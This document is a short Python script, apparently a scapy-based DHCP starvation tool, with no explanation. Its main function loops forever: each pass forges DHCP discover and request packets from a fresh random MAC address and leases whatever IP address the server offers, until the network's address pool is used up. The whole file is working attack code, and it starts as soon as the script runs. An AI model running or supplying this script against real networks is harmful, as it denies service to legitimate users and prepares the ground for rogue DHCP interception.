from scapy.all import *

def mac_to_bytes(mac_addr: str) -> bytes:
    return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")

def send_discover(src_mac, random_xid, flag):
    pkt = Ether(dst = "ff:ff:ff:ff:ff:ff", src = src_mac, type = 0x0800)
    pkt /= IP(src = "0.0.0.0", dst = "255.255.255.255")
    pkt /= UDP(dport = 67, sport = 68)
    pkt /= BOOTP(op = 1, htype = 1, hlen = 6, flags = flag, chaddr = mac_to_bytes(src_mac), xid = random_xid)
    #pkt /= BOOTP(op = 1, htype = 1, hlen = 6, chaddr = src_mac, xid = random_xid)
    pkt /= DHCP(options = [("message-type", "discover"), "end"])
    sendp(pkt, verbose=False)
    print("Sent discovery. Waiting for offer...")

def send_request(src_mac, offer_ip, random_xid):
    pkt = Ether(dst = "ff:ff:ff:ff:ff:ff", src = src_mac, type = 0x0800)
    pkt /= IP(src = "0.0.0.0", dst = "255.255.255.255")
    pkt /= UDP(dport = 67, sport = 68)
    pkt /= BOOTP(op = 1, htype = 1, hlen = 6, chaddr = mac_to_bytes(src_mac), xid = random_xid)
    #pkt /= BOOTP(op = 1, htype = 1, hlen = 6, chaddr = mac_to_bytes(src_mac) + b'\x00'*10, xid = 0x4b03A111)
    pkt /= DHCP(options = [("message-type", "request"), ("requested_addr", offer_ip), "end"])
    sendp(pkt, verbose=False)
    print(f"Got offer. Sent request for {offer_ip}.")

def main():
    while True:
        mac = str(RandMAC())
        xid = random.randint(1, 1000000000)
        send_discover(mac, xid, 0)
        offer = sniff(filter="udp and (port 67 or port 68)", timeout = 2)
        count = 0
        while len(offer) <= 0 and count < 1:
            send_discover(mac, xid, 32768)
            offer = sniff(filter="udp and (port 67 or port 68)", timeout = 2)
            count += 1
        if len(offer) > 0:
            offer_ip = str(offer[0][BOOTP].yiaddr)
            send_request(mac, offer_ip, xid)
        print("Swapping xid.")

main()
